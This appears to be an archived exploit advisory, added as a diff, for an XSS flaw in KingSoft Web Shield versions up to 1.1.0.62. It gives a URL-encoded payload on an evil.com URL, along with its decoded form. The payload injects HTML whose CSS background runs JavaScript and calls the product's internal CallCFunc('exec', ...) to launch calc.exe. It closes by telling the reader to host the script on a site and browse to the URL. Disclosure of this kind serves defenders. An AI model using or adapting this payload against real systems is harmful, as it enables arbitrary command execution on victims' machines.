@@ -1,0 +1,25 @@
+#
+# KingSoft Web Shield XSS and Remote Code Execution Vulnerability
+#
+# Found by inking
+#
+# Version <= 1.1.0.62
+#
+# Background: KingSoft Web Shield is a popular anti-malwebsites production  of KingSoft Inc. around China.
+#
+# Details: When the KSWebShield detects a malwebsite, it sends the evil url from the web browser
+# to the KSWebShield service, and popup a dialog which alerts that a malwebsite has been detected.
+# Because it's unreliable filter method, the attacker can insert any HTML tag in the alert dialog.
+# when the evil codes are successfully inserted, we can use javascript to call it's inner functions
+# of the KSWebShield and execute any system commands.
+#
+
+# The evil url maybe like this
+hxxp://evil.com/index.php?html=%3c%70%20%73%74%79%6c%65%3d%22%62%61%63%6b%67%72%6f%75%6e%64%3a%75%72%6c%28%6a%61%76%61%73%63%72%69%70%74%3a%70%61%72%65%6e%74%2e%43%61%6c%6c%43%46%75%6e%63%28%27%65%78%65%63%27%2c%27%63%3a%5c%5c%77%69%6e%64%6f%77%73%5c%5c%73%79%73%74%65%6d%33%32%5c%5c%63%61%6c%63%2e%65%78%65%27%20%29%29%22%3e%74%65%73%74%3c%2f%70%3e
+
+# When decoded by the KSWebShield, the url maybe like this
+hxxp://evil.com/index.php?html=<p style="background:url(javascript:parent.CallCFunc('exec','c:\\windows\\system32\\calc.exe' ))">test</p>
+
+# Just make a website with evil javascript codes, and browse the url shows above
+
+# milw0rm.com [2009-05-19]
